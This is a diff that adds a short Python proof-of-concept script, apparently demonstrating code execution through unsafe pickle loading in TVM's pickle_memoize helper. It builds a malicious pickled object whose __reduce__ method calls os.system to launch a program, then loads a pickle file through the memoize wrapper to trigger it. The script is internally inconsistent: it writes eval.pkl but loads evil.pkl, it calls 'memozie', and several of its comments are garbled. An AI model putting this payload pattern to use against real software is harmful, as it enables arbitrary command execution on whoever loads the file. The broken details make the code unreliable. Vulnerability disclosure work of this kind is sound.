@@ -1,0 +1,29 @@
+from tvm.contrib import pickle_memoize
+import pickle
+
+class A():
+    def __reduce__(self):
+        return eval, ("__import__('os').system('calc')",)
+
+
+# Introducing serialized objects
+a = [A()]
+with open("eval.pkl", "wb") as f:
+    pickle.dump(a, f)
+
+
+# Use pickle_memoize to load touch.pkl
+def load_pickle(file_name):
+    with open(file_name, "rb") as f:
+        return pickle.load(f)
+
+
+cache_key = "load_pickle_cache"
+memoize_load_pickle = pickle_memoize.memozie(cache_key)(load_pickle)
+# Try loading the file using skin memoize_load_pickle
+# Code that triggers the__reduce__method definition in class A
+try:
+    result = memoize_load_pickle("evil.pkl")
+    print("pickle file loaded sussessfully.")
+except Exception as e:
+    print(f"Error loading pickle file : {e}")
